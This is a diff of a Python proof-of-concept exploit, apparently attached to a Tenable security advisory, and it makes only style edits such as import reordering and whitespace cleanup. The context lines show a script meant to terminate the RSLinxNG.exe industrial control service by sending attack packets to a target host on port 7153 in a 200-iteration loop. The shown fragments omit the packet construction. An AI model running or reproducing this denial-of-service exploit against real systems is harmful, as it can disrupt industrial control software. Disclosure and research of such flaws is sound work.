@@ -6,8 +6,12 @@
 # Advisory: https://www.tenable.com/security/research/tra-2020-71
 ##
 
-import socket, argparse, struct
-import random, hexdump
+import argparse
+import socket
+import struct
+
+import hexdump
+
 
 def block(data, pad=False):
   dlen = len(data)
@@ -31,9 +35,9 @@ def dump(title, data):
 
 
 # MAIN
-# 
+#
 descr  = 'This script attempts to terminate RSLinxNG.exe.'
- 
+
 parser = argparse.ArgumentParser(description=descr)
 parser.add_argument('host', help='Target host')
 parser.add_argument('-p', '--port', type=int, default=7153, help='Target port, default: %(default)s')
@@ -55,10 +59,10 @@ for i in range(200):
   s.settimeout(5)
   s.connect((host, port))
   print('Sending attack packet...')
-  try: 
+  try:
     s.sendall(msg)
     s.recv(1024)
-  except: 
+  except:
     pass
   s.close()
 
